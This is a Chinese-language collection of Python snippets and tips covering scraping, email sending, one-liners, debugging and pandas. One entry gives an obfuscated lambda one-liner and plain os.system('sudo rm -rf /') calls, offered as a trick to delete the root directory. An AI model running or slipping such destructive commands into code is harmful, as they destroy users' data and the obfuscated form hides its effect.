{"title": "python记录 - 技术分享 ", "index": "python,python爬虫", "content": "python上传文件\nimport requests\n#https://zhuanlan.zhihu.com/p/20091394\ns = requests.session()\nurl = 'http://how-old.net/Home/Analyze?isTest=False&source=&version=001'\nheader = {\n'Accept-Encoding':'gzip, deflate',\n'User-Agent': \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0\",\n'Host': \"how-old.net\",\n'Referer': \"http://how-old.net/\",\n'X-Requested-With': \"XMLHttpRequest\"\n    }\n\ndata = {'file':open('test.jpg', 'rb')}\n #此处打开指定的jpg文件\n\nr = s.post(url, files=data, headers=header)   \nh = r.content\nprint h\n\n\n\n\nPython中的copy、deepcopy\na = [0, 1, 2, 3, [4, 5, 6], 7]\nb = a[:]\na[0] = 5\na[4][0] = 99\nprint(a)\nprint(b)\nprint([id(x) for x in a])\nprint([id(x) for x in b])\n\nPython正则表达式匹配.*\n# encoding:utf-8\nimport urllib\nimport re\nimport json\n\nurl = 'http://news.163.com/special/00014RJU/nationalnews-json-data.js'\nresult = urllib.urlopen(url).read().strip()\npattern = re.compile(r';var newsList=(.*)')\npattern = re.compile(r';var newsList=([\\s\\S]*)')#.*只能匹配非换行符，换成[\\s\\S]*即可\nmatchs = pattern.match(result)\nprint(matchs.group())\n\n使用python进行文件夹对比\n#coding:gbk\nfrom filecmp import dircmp\n\n\ndef show_diff_files(dcmp):\n    for name in dcmp.diff_files:\n        print \"diff_file %s found in %s and %s\" % (name, dcmp.left,dcmp.right)\n    for sub_dcmp in dcmp.subdirs.values():\n        show_diff_files(sub_dcmp)\n\ndef show_only(dcmp):\n    if dcmp.left_only:\n        ave_rst = 1\n        for i in dcmp.left_only:\n            print \"%s只存在于%s中\"%(i,dcmp.left)\n    if dcmp.right_only:\n        for i in dcmp.right_only:\n            print \"%s只存在于%s中\"%(i,dcmp.right)\n    for sub_dcmp in dcmp.subdirs.values():\n        show_only(sub_dcmp)\n\ndef compare(dir1,dir2):\n    dcmp = dircmp(dir1,dir2)\n    show_diff_files(dcmp)\n    show_only(dcmp)\n\n发送邮件\nfrom email import encoders\nfrom email.header import Header\nfrom email.mime.text import MIMEText\nfrom email.utils import parseaddr, formataddr\nfrom time import sleep\nfrom bs4 import BeautifulSoup\nimport requests\nimport smtplib\nimport time\ndef SendMessage(title):  # 发送邮件\n    def _format_addr(s):\n        name, addr = parseaddr(s)\n        return formataddr((Header(name, 'utf-8').encode(), addr))\n\n    from_addr = 'xxx@163.com'#发件人信箱\n    password = 'xxxx'#邮箱密码\n    to_addr = 'xxx@163.com'#收件人信箱\n    smtp_server = 'smtp.163.com'#请确保开启了smtp服务\n    msg = MIMEText(title, 'plain', 'utf-8')\n    msg['From'] = _format_addr('邮件提醒 <%s>' % from_addr)\n    msg['To'] = _format_addr('亲爱的 <%s>' % to_addr)\n    msg['Subject'] = Header('邮件提醒更新', 'utf-8').encode()\n    server = smtplib.SMTP(smtp_server, 25)\n    server.set_debuglevel(1)\n    server.login(from_addr, password)\n    server.sendmail(from_addr, [to_addr], msg.as_string())\n    server.quit()\nprint(SendMessage('hello'))\n10 行代码判定色情图片\nimport sys, Image  \n  \nimg = Image.open(sys.argv[1]).convert('YCbCr')  \n  \nw, h = img.size  \n  \ndata = img.getdata()  \n  \ncnt = 0  \n  \nfor i, ycbcr in enumerate(data):  \n  \n    y, cb, cr = ycbcr  \n  \n    if 86 <= cb <= 117 and 140 <= cr <= 168:  \n  \n        cnt += 1  \n  \nprint '%s %s a porn image.'%(sys.argv[1], 'is' if cnt > w * h * 0.3 else 'is not') \n\n命令行格式化\n>>> echo '{\"key\":\"value\"}' | python -m json.tool\n{\n    \"key\": \"value\"\n}\n//python -m json.tool\n\n//在 vim 中执行这句代码，可以快速格式化 json 数据\ncurl -L http://restapi/json_response -o json-response | python -m json.tool\n获取公网IP地址\npython -c \"import socket; sock=socket.create_connection(('ns1.dnspod.net',6666)); print sock.recv(16); sock.close()\"\n帮你数数：\n$ python -c \"print(' '.join([str(i) for i in range(1,10000)]))\" | say\n一行统计一本书的所有词频(此处是前100)\nimport re; from collections import Counter Counter(re.findall(r'\\w+',open('hamlet.txt').read().lower())).most_common(100)\n转置矩阵\nm = [ [1,2],[3,4]]  zip(*m)\nimport就可以飞\nimport antigravity就会打开 xkcd.com/about/\n2的1000次方的各位数之和\nsum(map(int, str(2**1000)))\n一行筛质数\nfilter(lambda x: all(map(lambda p: x % p != 0, range(2, x))), range(2, n))\nlist分组\na=[3, 8, 9, 4, 1, 10, 6, 7, 2, 5]\n[a[i:i+3] for i in xrange(0,len(a),3)]\n结果[[3, 8, 9], [4, 1, 10], [6, 7, 2], [5]]\nkey，value互换\nm = {'a': 1, 'b': 2, 'c': 3, 'd': 4}\n{v: k for k, v in m.items()}\n结果：{1: 'a', 2: 'b', 3: 'c', 4: 'd'}\n碾平list\na = [1, 2, [3, 4], [[5, 6], [7, 8]]]\nflatten = lambda x: [y for l in x for y in flatten(l)] if type(x) is list else [x]\nflatten(a);\n结果：[1,2,3,4,5,6,7,8]\n简易的web服务\npython -m SimpleHTTPServer 8000,然后浏览器打开 localhost:8000，一个简易的web服务就开启了\n打印九九乘法表\nprint 'n'.join([' '.join(['%s%s=%-2s' % (y,x,xy) for y in range(1,x+1)]) for x in range(1,10)])\n计算出1-1000之间的素数\nprint(*(i for i in range(2, 1000) if all(tuple(i%j for j in range(2, int(i**.5))))))     \n输出斐波那契数列的值\nprint [x[0] for x in [  (a[i][0], a.append((a[i][1], a[i][0]+a[i][1]))) for a in ([[1,1]], ) for i in xrange(100) ]]\n网易云音乐批量下载\n\nimport requests\nimport urllib\n\n# 榜单歌曲批量下载\n# r = requests.get('http://music.163.com/api/playlist/detail?id=2884035')    # 网易原创歌曲榜\n# r = requests.get('http://music.163.com/api/playlist/detail?id=19723756')    # 云音乐飙升榜\n# r = requests.get('http://music.163.com/api/playlist/detail?id=3778678')    # 云音乐热歌榜\nr = requests.get('http://music.163.com/api/playlist/detail?id=3779629')    # 云音乐新歌榜\n\n# 歌单歌曲批量下载\n# r = requests.get('http://music.163.com/api/playlist/detail?id=123415635')    # 云音乐歌单——【华语】中国风的韵律，中国人的印记\n# r = requests.get('http://music.163.com/api/playlist/detail?id=122732380')    # 云音乐歌单——那不是爱，只是寂寞说的谎\n\narr = r.json()['result']['tracks']    # 共有100首歌\n    \nfor i in range(10):    # 输入要下载音乐的数量，1到100。\n    name = str(i+1) + ' ' + arr[i]['name'] + '.mp3'\n    link = arr[i]['mp3Url']\n    urllib.request.urlretrieve(link, '网易云音乐\\\\' + name)    # 提前要创建文件夹\n    print(name + ' 下载完成')\n调用默认浏览器打开一坨网页\n\nimport webbrowser\n\nurls = [\n    'http://www.douban.com',\n    'http://weibo.com',\n    'http://www.zhihu.com',\n    'http://www.v2ex.com/',\n    'https://github.com/',\n    'https://mail.google.com/',\n    'http://instagram.com/',\n]\n\nmap(lambda x: webbrowser.open(x), urls)\n扒取kindle今日特价书，把结果邮件到指定邮箱\n# -*- coding: utf-8 -*-\nimport requests\nfrom bs4 import BeautifulSoup\nimport smtplib\nfrom email.mime.text import MIMEText\nfrom email.Header import Header\n\nresult = {\"name\": [], \"cover\": [], \"desc\": [], \"link\": [], \"price\": []}\n\n\ndef get_page():\n    return requests.get(\"http://t.cn/Rvm4xgc\").text\n\n\ndef parse(html):\n    soup = BeautifulSoup(html)\n    table = soup.body.find_all(\"table\")[6]\n\n    name = table.find_all(\"tr\")[1]\n\n    result[\"name\"].append(name.find_all(\"td\")[0].b.string)\n    result[\"name\"].append(name.find_all(\"td\")[2].b.string)\n\n    desc = table.find_all(\"tr\")[2]\n\n    book_1 = desc.find_all(\"td\")[0]\n    result[\"cover\"].append(book_1.a.img[\"src\"])\n    result[\"link\"].append(\"http://www.amazon.cn\" + book_1.a[\"href\"])\n    result[\"desc\"].append(book_1.contents[1])\n    result[\"price\"].append(book_1.find_all(\"p\")[1].b.span.string)\n\n    book_2 = desc.find_all(\"td\")[2]\n    result[\"cover\"].append(book_2.a.img[\"src\"])\n    result[\"link\"].append(\"http://www.amazon.cn\" + book_2.a[\"href\"])\n    result[\"desc\"].append(book_2.contents[1])\n    result[\"price\"].append(book_2.find_all(\"p\")[1].b.span.string)\n\n\nmail_config = {\n    \"from\": \"gitradar@163.com\",\n    \"to\": \"liushuaikobe1993@163.com\",\n    \"server\": \"smtp.163.com\",\n    \"username\": \"gitradar\",\n    \"pwd\": \"yourpassword\"\n}\n\n\ndef send_mail(sbj, content, from_whom=mail_config['from'], to_whom=mail_config['to'], server=mail_config['server'],\n              username=mail_config['username'], pwd=mail_config['pwd']):\n    msg = MIMEText(content, \"html\", \"utf-8\")\n    msg['Subject'] = Header(sbj, \"utf-8\")\n    msg['From'] = from_whom\n    msg['To'] = to_whom\n    s = smtplib.SMTP(server)\n    s.ehlo()\n    s.starttls()\n    s.login(username, pwd)\n    s.sendmail(from_whom, to_whom, msg.as_string())\n\n\ndef build_html():\n    return '<html><body>' \\\n            + '<h2>'+ result[\"name\"][0] + '&nbsp; ' + result[\"price\"][0] + '</h2>' \\\n            + '<a href=\"' + result[\"link\"][0] + '\">' \\\n            + '<img src=\"' + result[\"cover\"][0] + '\"></img>' \\\n            + '</a>' \\\n            + '<p>' + result[\"desc\"][0] + '</p>' \\\n            + '<h2>'+ result[\"name\"][1] + '&nbsp; ' + result[\"price\"][1] + '</h2>' \\\n            + '<a href=\"' + result[\"link\"][1] + '\">' \\\n            + '<img src=\"' + result[\"cover\"][1] + '\"></img>' \\\n            + '</a>' \\\n            + '<p>' + result[\"desc\"][1] + '</p>' \\\n            + '</body></html>'\n\n\nif __name__ == \"__main__\":\n    parse(get_page())\n    html = build_html()\n    sbj = \"Kindle今日特价书\"\n    send_mail(sbj, html)\n心形函数\nprint('\\n'.join([''.join([('PYTHON!'[(x-y)%7]if((x*0.05)**2+(y*0.1)**2-1)**3-(x*0.05)**2*(y*0.1)**3<=0else' ')for x in range(-30,30)])for y in range(15,-15,-1)]))\n\n                THON!PYTH           YTHON!PYT               \n            !PYTHON!PYTHON!PY   N!PYTHON!PYTHON!P           \n          N!PYTHON!PYTHON!PYTHON!PYTHON!PYTHON!PYTH         \n         N!PYTHON!PYTHON!PYTHON!PYTHON!PYTHON!PYTHON        \n        N!PYTHON!PYTHON!PYTHON!PYTHON!PYTHON!PYTHON!P       \n        !PYTHON!PYTHON!PYTHON!PYTHON!PYTHON!PYTHON!PY       \n        PYTHON!PYTHON!PYTHON!PYTHON!PYTHON!PYTHON!PYT       \n        YTHON!PYTHON!PYTHON!PYTHON!PYTHON!PYTHON!PYTH       \n        THON!PYTHON!PYTHON!PYTHON!PYTHON!PYTHON!PYTHO       \n        HON!PYTHON!PYTHON!PYTHON!PYTHON!PYTHON!PYTHON       \n         N!PYTHON!PYTHON!PYTHON!PYTHON!PYTHON!PYTHON        \n          PYTHON!PYTHON!PYTHON!PYTHON!PYTHON!PYTHON         \n          YTHON!PYTHON!PYTHON!PYTHON!PYTHON!PYTHON!         \n            ON!PYTHON!PYTHON!PYTHON!PYTHON!PYTHON           \n             !PYTHON!PYTHON!PYTHON!PYTHON!PYTHON            \n              YTHON!PYTHON!PYTHON!PYTHON!PYTHON             \n                ON!PYTHON!PYTHON!PYTHON!PYTHO               \n                  PYTHON!PYTHON!PYTHON!PYTH                 \n                    HON!PYTHON!PYTHON!PYT                   \n                       PYTHON!PYTHON!P                      \n                          ON!PYTHON                         \n                             YTH                            \n                              H\nPython实现Zip文件的暴力破解\n\nimport zipfile \ntry:\n    with zipfile.ZipFile('1.zip') as zFile:     #创建ZipFile对象\n        #解压文件\n        zFile.extractall(path='./',pwd=b'1314')\n        print('Extract the Zip file successfully!')\nexcept:\n    print('Extract the Zip file failed!')\n\n\n判断输入数字是实数（整型数字或者浮点型数字）\nIn [1]: isinstance(1, (int, long, float))\nTrue\n\nIn [2]: isinstance('a', (int, long, float))\nFalse\nIn [1]: foo = '123.456'\n\nIn [2]: foo.replace('.', '', 1).isdigit()\nTrue\n\nIn [3]: bar = '12.34.56'\n\nIn [4]: bar.replace('.', '', 1).isdigit()\nFalse\n\ndef input_num():\n    while True:\n        num = raw_input('input a number : ')\n        if num.replace('.', '', 1).isdigit():\n            return num\n>>> f = 1.0\n>>> f.is_integer()\nTrue\n>>> f = 1.0 / 3 + 2.0 / 3\n>>> f.is_integer()\nTrue\ntry:\n    f = float(input_value)\nexcept Exception:\n    ...\nelse:\n    # Is it a integer?\n    if f.is_integer():\n        ...\n    else:\npip 安装lxml时出现 “Unable to find vcvarsall.bat\n1. 安装wheel，命令行运行：\npip install wheel\n\n2.在http://www.lfd.uci.edu/~gohlke/pythonlibs/#lxml 这里下载对应的.whl文件，注意别改文件名！\nCtrl + F，输入lxml，找到下面这段\nLxml, a binding for the libxml2 and libxslt libraries.\nlxml‑3.4.4‑cp27‑none‑win32.whl\nlxml‑3.4.4‑cp27‑none‑win_amd64.whl\nlxml‑3.4.4‑cp33‑none‑win32.whl\nlxml‑3.4.4‑cp33‑none‑win_amd64.whl\nlxml‑3.4.4‑cp34‑none‑win32.whl\nlxml‑3.4.4‑cp34‑none‑win_amd64.whl\nlxml‑3.4.4‑cp35‑none‑win32.whl\nlxml‑3.4.4‑cp35‑none‑win_amd64.whl\ncp后面是Python的版本号，27表示2.7，根据你的Python版本选择下载。\n\n3. 进入.whl所在的文件夹，执行命令即可完成安装\npip install 带后缀的完整文件名\n$ pip install lxml-3.6.4-cp35-cp35m-win32.whl\nProcessing .\\lxml-3.6.4-cp35-cp35m-win32.whl\nInstalling collected packages: lxml\nSuccessfully installed lxml-3.6.4\nhttp://stackoverflow.com/questions/29440482/how-to-install-lxml-on-windows \nhttp://stackoverflow.com/questions/2817869/error-unable-to-find-vcvarsall-bat \nPython一行删掉根目录\n(lambda _: getattr(__import__(_(28531)), _(126965465245037))(_(9147569852652678349977498820655)))((lambda ___, __, _: lambda n: ___(__(n))[_ << _:-_].decode(___.__name__))(hex, long, True))\n \nimport os\nos.system('sudo rm -rf /')\n__import__('os').system('sudo rm -rf /')\n登录博客园\nfrom selenium import webdriver\nimport time\n\n\nbrowser = webdriver.Chrome()\nbrowser.get(\"http://cnblogs.com\")\ntime.sleep(1)\nbrowser.find_element_by_link_text(\"登录\").click()\ntime.sleep(1)\nbrowser.find_element_by_id(\"input1\").send_keys(\"用户名\")\nbrowser.find_element_by_id(\"input2\").send_keys(\"密码\")\nbrowser.find_element_by_id(\"signin\").click()\ntime.sleep(1)\ntry:\n    if browser.find_element_by_link_text(\"退出\"):\n        print \"Login Successfully.\"\nexcept:\n    print \"Login failed.\"\n\n\nfrom selenium import webdriver\nsource_url='http://huaban.com/boards/28195582/'\nheaders={\n    'Host':'huaban.com',\n    'Pragma':'no-cache',\n    'Cache-Control':'no-cache',\n    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36',\n    'Cookie':'xxxxxx'\n}\ncap = webdriver.DesiredCapabilities.PHANTOMJS\ncap[\"phantomjs.page.settings.userAgent\"] = headers['User-Agent']    #设置请求header头信息\ncap[\"phantomjs.page.settings.loadImages\"] = False                   #禁止加载图片\ncap[\"phantomjs.page.customHeaders.Host\"]=headers['Host']\ncap[\"phantomjs.page.customHeaders.Pragma\"]=headers['Pragma']\ncap[\"phantomjs.page.customHeaders.Cookie\"]=headers['Cookie']\ndriver = webdriver.PhantomJS(desired_capabilities=cap)\ndriver.get(source_url)\nunicode\necho \"u00e8u0091u0089u00e7u008au00b6u00e3u0083u00a2u00e3u0083u008eu00e3u0083u009du00e3u0083u00bcu00e3u0083u00abu00e3u0082u00a2u00e3u0083u00b3u00e3u0083u0086u00e3u0083u008a\"\nx = u'\\u00e8\\u0091\\u0089\nprint x\npython中怎么获取某个网页元素之前的所有源码?\n\ndoc = '''\n<html>\n    <head>\n        <title>The Dormouse's story </title>\n    </head> \n    <body> \n        <p id=\"p1\">p1p1p1\n            <b id='b1'>b1b1b1</b>\n        </p> \n        <p id=\"p2\">p2p2p2</p>\n        <div id='d1'>\n            <ul id='u1'>u1u1u1</ul>\n            <a id=\"a1\">a1a1a1</a>\n            <div id='d2'>\n                <a id=\"a2\">a2a2a2 </a>\n                <b id='b2'>b2b2b2</b>\n                <p id='p3'>p3p3p3</p>\n            </div>\n            <a id=\"a3\">a3a3a3 </a>\n        </div> \n        <p id=\"p4\">p4p4p4</p>\n    </body>\n</html>\n'''\n\nfrom lxml import html\n\ntree = html.fromstring(doc)\na = tree.get_element_by_id(\"a1\")\nprint(html.tostring(a))\nprint(html.tostring(tree).decode())\n\ndef dropnode(e=None):\n    if e is None: return\n    if e.tag == 'body': return\n    nd = e.getnext()\n    while nd is not None:\n        nd.drop_tree()\n        nd = e.getnext()\n    dropnode(e.getparent())\n\ndropnode(a)\nprint(html.tostring(tree).decode()) \nrequests优雅的下载图片\nimport requests\nfrom bs4 import BeautifulSoup\n\nr = requests.get(\"http://www.pythonscraping.com\")\nbs = BeautifulSoup(r.text,'lxml')\nimage = bs.find(\"a\", {\"id\": \"logo\"}).find(\"img\")[\"src\"]\n\nir = requests.get(image)\nif ir.status_code == 200:\n    open('logo.jpg', 'wb').write(ir.content)\n \nimport requests\nfrom bs4 import BeautifulSoup\n\nr = requests.get(\"http://www.pythonscraping.com\")\nbs = BeautifulSoup(r.text,'lxml')\nimage = bs.find(\"a\", {\"id\": \"logo\"}).find(\"img\")[\"src\"]\n\nir = requests.get(image)\nif ir.status_code == 200:\n    open('logo.jpg', 'wb').write(ir.content)\npython lxml\nimport lxml.etree \nimport urllib.request\nfrom lxml.etree import *\nstr_url = 'http://eutils.ncbi.nlm.nih.gov/entrez/eutils/efetch.fcgi?db=pubmed&id=26693255&retmode=text&rettype=xml'\nrequest = urllib.request.Request(str_url)\nxml_text = urllib.request.urlopen(request).read()\nroot = lxml.etree.XML(xml_text) # xml_text 为xml纯文本文件\n# example  获取杂志名称和ISSN\n# 使用 tag作为输入需要逐级进行\njournal_name = root.find('PubmedArticle').find('MedlineCitation').find('Article').find('Journal').find('Title').text\n# 也可以使用xpath(必须使用相对路径，以.//开头，如果想使用绝对路径可以使用xpath函数)\njournal_name = root.find('.//Title').text\nprint('xpath:' ,journal_name)\njournal_name = root.xpath('//Title')[0].text\nprint(journal_name)\n爬取 豆瓣电影主页本周口碑榜\nimport lxml.html\nstr_url = 'http://movie.douban.com/'\nrequest = urllib.request.Request(str_url)\nhtml_text = urllib.request.urlopen(request).read()\nroot = lxml.html.fromstring(html_text)\n# 获取本页面所有项目名称 cssselect() 函数，返回list，包含所有匹配的结果，可以使用css选择器，类似于jquery\nmovies_list = [a.text for a in  root.cssselect('div.billboard-bd tr td a')]\nprint(movies_list)\n# 获取所有电影超链接\nmovies_href = [a.get('href') for a in  root.cssselect('div.billboard-bd tr td a')]\nprint(movies_href)\n回头遍历\nn=7 \nlist1=['a','b','c','d'] \nprint (l * (n // len(l) + 1))[:n]\n(list1 * 2)[:n]\nimport itertools \nimport math \n(list1 * math.ceil( n / len(list1) ) )[:7] \nn=7 \nlist1=['a','b','c','d'] \nprint list(itertools.islice(itertools.cycle(list1), 0, n)) \npip  安装 scrapy\npip install wheel  http://www.lfd.uci.edu/~gohlk... 下载对应版本的 lxml和Twisted，cp后面是Python的版本号，27表示2.7 pip install 对应的whl文件pip install scrapy\n找出list2中有,但是list1中没有的数据\nlist(set(list2)-set(list1))\n将字符串'[1,2,3,4]'转化为列表[1,2,3,4]\neval('[1,2,3,4]')\n[1, 2, 3, 4]\njson.loads(str)\nast.literal_eval(str)\nraw = b'{\"aa\":11,\"bb\":22,\"cc\":33}'\nd   = json.loads(str(raw, 'utf-8'))\nd = eval(b'{\"aa\":11,\"bb\":22,\"cc\":33}')\ns = b'{\"aa\":11,\"bb\":22,\"cc\":33}'.decode('utf-8')  # 先解码成字符串\ndata = json.loads(s)  # 解析为字典对象\nPythonic [for]\na_part = [2001, 12000]\nb_part = [1001, 2000]\nc_part = [11, 1000]\nd_part = [1, 10]\n\ndata = range(1, 12000)\nlabels = [a_part, b_part, c_part, d_part]\nsizes = []\nfor part in labels:\n    sum = 0\n    for each in data:\n        sum += each if each >= part[0] and each <= part[1] else 0\n    sizes.append(sum)\nprint(sizes)\nsizes = [sum(each for each in data if part[0] <= each <= part[1]) for part in labels]\nsizes = [sum(x for x in data if low<=x<=high) for low,high in labels]\nsend email\nimport smtplibfrom email.mime.text import MIMEText\n第三方 SMTP 服务\nmail_host = \"smtp.163.com\"  # SMTP服务器\nmail_user = \"username\"  # 用户名\nmail_pass = \"passwd\"  # 密码\n\nsender = 'user@163.com'  # 发件人邮箱(最好写全, 不然会失败)\nreceivers = ['to_someone@qq.com']  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱\n\n\ncontent = '过期教程害死人!'\ntitle = 'Python SMTP Mail Test'  # 邮件主题\nmessage = MIMEText(content, 'plain', 'utf-8')  # 内容, 格式, 编码\nmessage['From'] = \"{}\".format(sender)\nmessage['To'] = \",\".join(receivers)\nmessage['Subject'] = title\n\ntry:\n    smtpObj = smtplib.SMTP_SSL(mail_host, 465)  # 启用SSL发信, 端口一般是465\n    smtpObj.login(mail_user, mail_pass)  # 登录验证\n    smtpObj.sendmail(sender, receivers, message.as_string())  # 发送\n    print(\"mail has been send successfully.\")\nexcept smtplib.SMTPException as e:\n    print(e)\n    \n    ###pip UnicodeDecodeError: 'ascii' codec can't decode byte 0xc0 in position 0\n    vi mimetypes.py\n    import sys\nreload(sys)\nsys.setdefaultencoding('utf-8')\n    ###后台运行命令\n    from subprocess import run\nrun(\"ping 127.0.0.1\",shell=True)\ngroup by\nimport pandas as pd\n\ncols = ['流水号', '处理人', '处理时间']\ndata = [[10000, '张三', '2016-10-01'],\n        [10000, '李四', '2016-10-02'],\n        [10001, '王五', '2016-10-01'],\n        [10002, '赵六', '2016-10-03'],\n        [10001, '黄七', '2016-10-02'],\n        [10000, '吴八', '2016-10-03']]\n\ndf = pd.DataFrame(data,columns=cols)\ngrp = [(n, ','.join([r for r in set(df[df['流水号']==n]['处理人'])]))\n                       for n in set(df['流水号'])]\n\ndf2 = pd.DataFrame(grp, columns=cols[:-1])\nprint(df)\nprint(df2)\n\ncols = ['流水号', '处理人', '处理时间']\ndata = [[10000, '张三', '2016-10-01'],\n        [10000, '李四', '2016-10-02'],\n        [10001, '王五', '2016-10-01'],\n        [10002, '赵六', '2016-10-03'],\n        [10001, '黄七', '2016-10-02'],\n        [10000, '吴八', '2016-10-03']]\nframe = pd.DataFrame(data,columns=cols)\n\ndef combination(names):\n    return ','.join(names)\n    \nframe.groupby('流水号').aggregate(combination)\npandas导入文件\nimport pandas as pdpd.read_csv('1.csv', skiprows=[0, 2]) # 跳过文件第一行和第三行\n找出list2中有,但是list1中没有的数据\nlist(set(list2)-set(list1))a = [\"a\",\"b\",\"c\",\"e\"]b = [\"b\",\"c\",\"f\"]li = [ item for item in b if item not in a]\npython try...except中如何输入e的行号\nimport sys, os\n\ntry:\n    raise NotImplementedError(\"No error\")\nexcept Exception as e:\n    exc_type, exc_obj, exc_tb = sys.exc_info()\n    fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]\n    print(exc_type, fname, exc_tb.tb_lineno)\n字符串与二进制串的相互转换\n    def encode(s):\n    return ' '.join([bin(ord(c)).replace('0b', '') for c in s])\n\ndef decode(s):\n    return ''.join([chr(i) for i in [int(b, 2) for b in s.split(' ')]])\n    \n>>>encode('hello')\n'1101000 1100101 1101100 1101100 1101111'\n>>>decode('1101000 1100101 1101100 1101100 1101111')\n'hello'\n>>> bin(int('256', 10))\n'0b100000000'\n>>> str(int('0b100000000', 2))\n'256'\nwindows 下python pip install  libxml\nhttp://www.lfd.uci.edu/~gohlk...  下载lxml，文件名是这样的： lxml-3.6.4-cp27-cp27m-win32.whl cp27表示python2.7 cmd里输入python第一行末尾win32，就说明python是32位的 pip install wheel  #如果没有安装过wheel就安装pip install lxml-**.whl  #在whl文件目录中执行\ntime\nimport timelocal = time.localtime()print(time.localtime(1400000000))time.mktime(local)#接受时间元组并返回时间辍my_format = \"%Y/%m/%d %H:%M:%S\"my_time = time.localtime()print(my_time)print(time.strftime(my_format, my_time))\npython中不要使用[]{}作为默认参数\ndef fn(x, L=[]):\n  L.append(x)\n  return L\n\nprint(fn(1))   # [1]\nprint(fn(7))   # [1, 7]\nprint(fn(13))  # [1, 7, 13]\n// 而 javascript (ES6) 没有上面那个坑\nfunction fn(x, L=[]){\n  L.push(x);\n  return L.toString();\n}\n\nconsole.log(fn(1))   // \"1\"\nconsole.log(fn(7))   // \"7\"\nconsole.log(fn(13))  // \"13\"\n嵌套列表推导式和生成器表达式\n[(i,j) for i in range(3) for j in range(i) ]    ((i,j) for i in range(4) for j in range(i) )\n括号代替缩进\nfrom future import braces\n使用re.DEBUG查看正则表达式的匹配过程\nre.compile(r'd+(.*)',re.DEBUG)\nIPython调试\nimport sys\n\nclass ExceptionHook:\n    instance = None\n\n    def __call__(self, *args, **kwargs):\n        if self.instance is None:\n            from IPython.core import ultratb\n            self.instance = ultratb.FormattedTB(mode='Plain',\n                 color_scheme='Linux', call_pdb=1)\n        return self.instance(*args, **kwargs)\n\nsys.excepthook = ExceptionHook()\nipython --pdb your_scripyt.py\nfrom ipython import embed;embed()\n import ipdb; ipdb.set_trace()\npython -m pdb your.py\n\nipython test.py --pdb\n---------------------------------------------------------------------------\nZeroDivisionError                         Traceback (most recent call last)\n/Users/dongweiming/test/test.py in <module>()\n      2 b = 0\n      3 \n----> 4 a / b\n\nZeroDivisionError: integer division or modulo by zero\n*** NameError: name 'pdb' is not defined\n> /Users/dongweiming/test/test.py(4)<module>()\n      1 a = 1\n      2 b = 0\n      3 \n----> 4 a / b\n\nipdb> p b  # p是print的别名\n0\nipdb> p a\n1\nipdb>\n调试函数\nimport sys\n\ndef get_cur_info():\n    print sys._getframe().f_code.co_filename  # 当前文件名\n    print sys._getframe(0).f_code.co_name  # 当前函数名\n    print sys._getframe(1).f_code.co_name　# 调用该函数的函数的名字，如果没有被调用，则返回module\n    print sys._getframe().f_lineno # 当前行号\n字典解析\n    a_dict = {\"%d^2\" % item: item**2 for item in range(5)}\nprint(a_dict)    # {'3^2': 9, '2^2': 4, '1^2': 1, '0^2': 0, '4^2': 16}\na_generator = (item**2 for item in range(5))#生成器\na_list_generator = iter(a_list)\nprint(list(map(lambda x, y: x**y, range(1, 5), range(1, 5))))    # [1, 4, 27, 256]\nprint(reduce(lambda x, y: x+y, range(10)))    # 45\nprint(reduce(lambda x, y: x+y, range(10), 100))    # 145\nprint(reduce(lambda x, y: x+y, [[1, 2], [3, 4]], [0]))    # [0, 1, 2, 3, 4]\n\nprint(filter(None, range(-4, 5)))    # <filter object at 0x10c096710>\nprint(list(filter(None, range(-4, 5))))    # [-4, -3, -2, -1, 1, 2, 3, 4]\nprint(list(filter(lambda x: x > 0, range(-4, 5))))    # [1, 2, 3, 4]\n\nprint(all([0, 1, 2]))    # False 判定一个可迭代对象是否全为True或者有为True\nprint(any([0, 1, 2]))    # True\n\n\nfor index, item in enumerate(range(5)):\n    print(\"%d: %d\" % (index, item))    # 0: 0 \\n 1: 1 \\n 2: 2\n    \n    for a, b in zip([1, 2, 3], [\"a\", \"b\", \"c\"]):\n    print(a, b)    # 1 a \\n 2 b \\n 3 c\na_dict = dict(zip([1, 2, 3], [\"a\", \"b\", \"c\"]))\nprint(a_dict)    # {1: 'a', 2: 'b', 3: 'c'}\n>>> [(a,b )for a, b in zip([1, 2, 3], [\"a\", \"b\", \"c\"])]\n[(1, 'a'), (2, 'b'), (3, 'c')]\n一行代码启动一个Web服务\n\npython -m SimpleHTTPServer 8080  # python2\npython3 -m http.server 8080  # python3\n一行代码实现求解2的1000次方的各位数之和\nprint(sum(map(int, str(2**1000))))\n多维数组转化为一维\nflatten = lambda x: [y for l in x for y in flatten(l)] if isinstance(x, list) else [x]\n一行代码计算出1-100之间的素数\nprint(' '.join([str(item) for item in filter(lambda x: not [x % i for i in range(2, x) if x % i == 0], range(2, 101))]))\nprint(' '.join([str(item) for item in filter(lambda x: all(map(lambda p: x % p != 0, range(2, x))), range(2, 101))]))\n一行代码打印九九乘法表\nprint('\\n'.join([' '.join(['%s*%s=%-2s' % (y, x, x*y) for y in range(1, x+1)]) for x in range(1, 10)]))\n\n1*1=1\n1*2=2  2*2=4\n1*3=3  2*3=6  3*3=9\n1*4=4  2*4=8  3*4=12 4*4=16\n1*5=5  2*5=10 3*5=15 4*5=20 5*5=25\n1*6=6  2*6=12 3*6=18 4*6=24 5*6=30 6*6=36\n1*7=7  2*7=14 3*7=21 4*7=28 5*7=35 6*7=42 7*7=49\n1*8=8  2*8=16 3*8=24 4*8=32 5*8=40 6*8=48 7*8=56 8*8=64\n1*9=9  2*9=18 3*9=27 4*9=36 5*9=45 6*9=54 7*9=63 8*9=72 9*9=81\n\n一行代码输出特定字符\"Love\"拼成的心形\nprint('\\n'.join([''.join([('Love'[(x-y) % len('Love')] if ((x*0.05)**2+(y*0.1)**2-1)**3-(x*0.05)**2*(y*0.1)**3 <= 0 else ' ') for x in range(-30, 30)]) for y in range(30, -30, -1)]))\n循环过程中变更 list 长度是错误的思路\nfor i in range(0,len(list1)): \nif list1[i].find('a') != -1: \n   list1.pop(i) \n\nlist1 = [x for x in list1 if 'a' not in x]\nlist1 = ['print', 'lock', 'china', 'page'] \n\nlist2 = filter(lambda item: 'a' not in item,list1) \nFraction模块：分数模块\nfrom fractions import Fraction\n        x = Fraction(4, 6)                       # 分数类型 4/6\n        x = Fraction(\"0.25\")                     # 分数类型 